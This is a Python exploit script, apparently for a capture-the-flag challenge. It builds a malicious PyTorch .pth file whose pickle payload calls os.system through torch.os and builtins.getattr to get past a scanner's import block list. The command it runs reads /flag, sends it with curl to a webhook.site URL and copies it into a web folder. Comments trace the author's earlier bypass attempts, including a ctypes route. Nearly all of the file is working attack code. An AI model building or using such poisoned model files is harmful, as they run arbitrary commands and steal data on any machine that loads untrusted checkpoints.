import pickle
import zipfile
import io
import torch

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# V15: 利用 torch.os 绕过 import 限制
# 我们发现 torch 模块直接暴露了 os 模块。
# 扫描器允许 torch.* 的加载。
# 如果我们请求 GLOBAL ('torch', 'os')，这可能会被允许。
# 然后我们请求 GLOBAL ('torch.os', 'system') ?
# 或者我们获取 torch.os 对象后，再 getattr system。

# Opcode:
# 1. GET torch.os
#    How? GLOBAL 'torch' 'os' might not work directly if 'os' is a module instance inside torch, 
#    rather than a class/function defined in torch.
#    Pickle GLOBAL/STACK_GLOBAL does "from module import name".
#    If torch.py contains "import os", then "from torch import os" works.
#    
# 2. CALL system(cmd)

# Let's verify pickle behavior for submodule.
# Python: from torch import os -> works.
# Pickle: GLOBAL 'torch' 'os' -> works.

# Once we have 'os' module on stack. 
# We need 'system' attr.
# We CANNOT use GLOBAL 'torch.os' 'system' because 'torch.os' isn't a package name usually?
# actually os IS a module. So GLOBAL 'os' 'system' is standard.
# But GLOBAL 'os' 'system' is blocked.
#
# So we do:
# 1. GLOBAL 'torch' 'os' (Looks like torch dependency)
# 2. Get 'system' from it.
#    Use getattr(obj, 'system').
#    Need 'getattr'.
#    GLOBAL 'builtins' 'getattr' (might be blocked/monitored).
#    Maybe use 'torch.getattr'? No.
#    
#    Maybe `obj.__dict__['system']`? access via `dict.get`?
#    GLOBAL 'builtins' 'dict'
#    GLOBAL 'torch' 'os'
#    GLOBAL 'builtins' 'getattr'  <-- Risk
#
# Let's try V15: GLOBAL 'torch' 'os' + method call?
# Pickle allows calling `obj.method(args)`.
# Ops:
#   GET 'torch' 'os'
#   GET 'system' from it?
#   There isn't a "GET_ATTR" opcode (except via BUILD/state).
#   So we MUST use getattr() or similar.
#
# What if we use `torch.futures.os`? Similar.
#
# Let's risk `getattr` again but with Obfuscated String from V14?
# V14 failed.
#
# What if we use a different way to execute "system"?
# `os.execl` in `torch.os`?
# 
# Wait, if we have `os` from `torch.os`, we still need a way to call a function ON it.
#
# Is there a `torch.system`? No.
# 
# Let's look for a `torch` function that calls `system` or `exec`?
# `torch.utils.cpp_extension.os.system`?
#
# Let's try `ctypes`.
# `torch` uses `ctypes`.
# GLOBAL 'ctypes' 'CDLL'
# Call CDLL('libc.so.6').system(cmd)
#
# Using V15: Ctypes via ZIP.

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

STACK_GLOBAL = b'\x93'
REDUCE = b'R'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'

pkl = b'\x80\x02'

# 1. ctypes.CDLL(None) -> libc handle (on Linux mostly works, or 'libc.so.6')
# Try 'libc.so.6' for safety.
# STACK_GLOBAL 'ctypes' 'CDLL'
pkl += push_str('ctypes')
pkl += push_str('CDLL')
pkl += STACK_GLOBAL

pkl += push_str('libc.so.6')
pkl += TUPLE1
pkl += REDUCE
# Stack: [libc_obj]

# 2. libc.system(cmd)
# We need to get attribute 'system' from libc_obj.
# ctypes objects allow attribute access to get functions.
# But in Pickle we need `getattr` to get the attribute, OR load it via some other way.
# Does `CDLL` support `__getitem__`?  libc['system']? Yes, ctypes LibraryLoader supports it?
# CDLL instances usually support __getitem__.
# Let's check locally?
# Assuming yes.

# Opcode: libc_obj.__getitem__('system')
# We need __getitem__.
# getattr(libc, '__getitem__')('system')?
#
# If `getattr` is blocked, this is hard.
#
# Wait, `obj.attr` access in pickle is NOT supported directly. You must use `getattr` or `inst.__dict__` restoration.
#
# UNLESS we use `obj` as a callable? No.
#
# What if we use `torch.os` and assume `getattr` is allowed IF the args are not 'os', 'system'?
# The previous "Hacker detected" might be due to `builtins.bytes.fromhex` usage or `eval`.
#
# Let's try: `getattr(torch.os, 'system')(cmd)`
# With obfuscated 'system' string?
#
# Let's try simpler: `getattr` on `torch.os`.

# 1. getattr
pkl += push_str('builtins')
pkl += push_str('getattr')
pkl += STACK_GLOBAL
# 2. torch.os
pkl += push_str('torch')
pkl += push_str('os')
pkl += STACK_GLOBAL
# 3. 'system'
pkl += push_str('system')
# 4. getattr(torch.os, 'system')
pkl += TUPLE2
pkl += REDUCE
# 5. Call it
pkl += push_str(CMD)
pkl += TUPLE1
pkl += REDUCE

pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v15.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v15.pth (torch.os + getattr)")
